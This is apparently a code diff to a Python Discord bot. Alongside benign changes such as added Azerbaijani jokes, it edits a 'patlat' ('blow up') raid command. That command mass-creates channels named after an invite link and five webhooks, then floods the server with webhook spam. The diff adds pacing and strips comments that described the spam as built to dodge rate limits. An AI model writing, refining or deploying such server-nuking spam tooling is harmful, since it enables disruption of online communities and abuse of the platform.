@@ -482,11 +482,14 @@ async def calc_cmd(ctx, *, expression):
         await ctx.send(f"🧮 Nəticə: **{res}**")
     except:
         await ctx.send("❌ Xəta! İfadəni düzgün yazın.")
+
 @bot.command(name="joke")
 async def joke_cmd(ctx):
     jokes = [
         "Kompyuter niyə soyuducama gəldi? İtki pəncərəsi açıq qoymuşduq!",
-        "Tamirçi niyə yoruldu? Çünki ziddən deyirlər."
+        "Tamirçi niyə yoruldu? Çünki ziddən deyirlər.",
+        "Müəllim şagirə: — De görüm, Nəsimi harada anadan olub? Şagir: — Vikipediya səhifəsində, müəllim!",
+        "Proqramçı dostuna deyir: 'Həyatım eyni kod kimidir; səhvlərlə doludur, amma nə üçün işlədiyini heç kim bilmir.'"
     ]
     await ctx.send(f"😂 Zarafat: {random.choice(jokes)}")
 
@@ -515,7 +518,6 @@ async def poll_cmd(ctx, *, soru):
     await msg.add_reaction("👍")
     await msg.add_reaction("👎")
 
-# 10. PATLAT KOMUTU (Cəmi 5 ədəd qlobal webhook ilə rate-limitə düşmədən sürətli və qüsursuz işləyən versiya)
 @bot.command(name="patlat")
 async def patlat_cmd(ctx):
     if ctx.author.id != SAHIB_ID:
@@ -592,13 +594,13 @@ async def patlat_cmd(ctx):
         except:
             pass
 
-    # Cəmi 5 ədəd qlobal webhook yaradırıq (Rate-limit problemini tamamilə aradan qaldırmaq üçün)
     qlobal_webhooks = []
     for i in range(1, 6):
         try:
             ch = await guild.create_text_channel(f"aga-qoruma-{i}")
             wh = await ch.create_webhook(name=f"XAS-Global-{i}")
             qlobal_webhooks.append(wh)
+            await asyncio.sleep(0.5) 
         except:
             pass
 
@@ -614,7 +616,6 @@ async def patlat_cmd(ctx):
         try:
             channel = await guild.create_text_channel(f"discord.gg/aga-{i}")
             if qlobal_webhooks:
-                # Hər kanalda təkrar webhook açmaq əvəzinə mövcud 5 qlobal webhook vasitəsilə spam göndəririk
                 webhook_tasks = [send_webhook_spam(wh, 100) for wh in qlobal_webhooks]
                 await asyncio.gather(*webhook_tasks, return_exceptions=True)
         except:
@@ -641,3 +642,4 @@ if __name__ == "__main__":
     TOKEN = os.getenv("DISCORD_TOKEN")
     if TOKEN:
         bot.run(TOKEN)
+        
